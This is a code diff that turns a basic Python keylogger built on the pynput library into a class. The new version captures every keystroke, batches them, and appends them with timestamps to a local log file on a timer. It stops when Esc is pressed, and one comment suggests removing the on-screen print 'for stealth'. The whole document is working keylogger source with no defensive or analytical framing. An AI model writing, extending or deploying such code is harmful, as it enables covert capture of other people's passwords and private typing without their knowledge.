@@ -1,41 +1,81 @@
-import pynput
+from pynput.keyboard import Key, KeyCode, Listener
+from datetime import datetime
+from threading import Timer
+import time
 
-from pynput.keyboard import Key, Listener
+class KeyLogger:
+    def __init__(self, interval=30, batch_size=10, filename="log.txt"):
+        self.batch_size = batch_size
+        self.interval = interval
+        self.filename = filename
+        self.pressed_keys = []
+        self.timer = None
+        self.listener = None
 
-# Initialize variables
-key_count = 0
-pressed_keys = []
+    def on_press(self, key):
+        """Handle key press events"""
+        self.pressed_keys.append(key)
+        
+        # Write if batch size is reached
+        if len(self.pressed_keys) >= self.batch_size:
+            self.flush()
+            
+        # Optional: Remove print statement for stealth
+        print(f"Key pressed: {key}")
 
-def on_press(key):
-    """Handle key press event"""
-    global key_count, pressed_keys
+    def flush(self):
+        """Force write buffered keys to file"""
+        if self.pressed_keys:
+            self.write_to_file()
+            self.pressed_keys = []
+        self.reset_timer()
 
-    pressed_keys.append(key)
-    key_count += 1
-    print(f"{key} pressed")
+    def reset_timer(self):
+        """Reset interval timer after each flush"""
+        if self.timer:
+            self.timer.cancel()
+        self.timer = Timer(self.interval, self.flush)
+        self.timer.daemon = True
+        self.timer.start()
 
-    if key_count >= 10:
-        key_count = 0
-        write_to_file(pressed_keys)
-        pressed_keys = []
+    def write_to_file(self):
+        """Write buffered keys to log file with error handling"""
+        try:
+            with open(self.filename, "a", encoding="utf-8") as f:
+                f.write(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n")
+                for key in self.pressed_keys:
+                    # Handle special keys
+                    if isinstance(key, Key):
+                        if key == Key.space:
+                            f.write(" ")
+                        elif key == Key.enter:
+                            f.write("\n")
+                        elif key == Key.tab:
+                            f.write("\t")
+                    # Handle normal characters
+                    elif isinstance(key, KeyCode):
+                        if key.char is not None:
+                            f.write(key.char)
+        except Exception as e:
+            print(f"Error writing to file: {e}")
 
-def write_to_file(keys):
-    """Write keys to log file"""
-    with open("log.txt", "a") as file:
-        for key in keys:
-            key_str = str(key).replace("'", "")
-            if "space" in key_str:
-                file.write("\n")
-            elif not key_str.startswith("key"):
-                file.write(key_str)
+    def on_release(self, key):
+        """Stop listener on ESC key release"""
+        if key == Key.esc:
+            self.flush()
+            return False
 
-def on_release(key):
-    """Handle key release event"""
-    if key == Key.esc:
-        # Stop listener on ESC key press
-        return False
+    def start(self):
+        """Start keylogger and timing mechanisms"""
+        self.reset_timer()
+        self.listener = Listener(on_press=self.on_press, on_release=self.on_release)
+        self.listener.start()
+        self.listener.join()
 
-# Create and start keyboard listener
-listener = Listener(on_press=on_press, on_release=on_release)
-listener.start()
-listener.join()
+if __name__ == "__main__":
+    logger = KeyLogger(
+        interval=30,    # Flush every 30 seconds
+        batch_size=20,  # Or when 20 keys are logged
+        filename="keylog.txt"
+    )
+    logger.start()
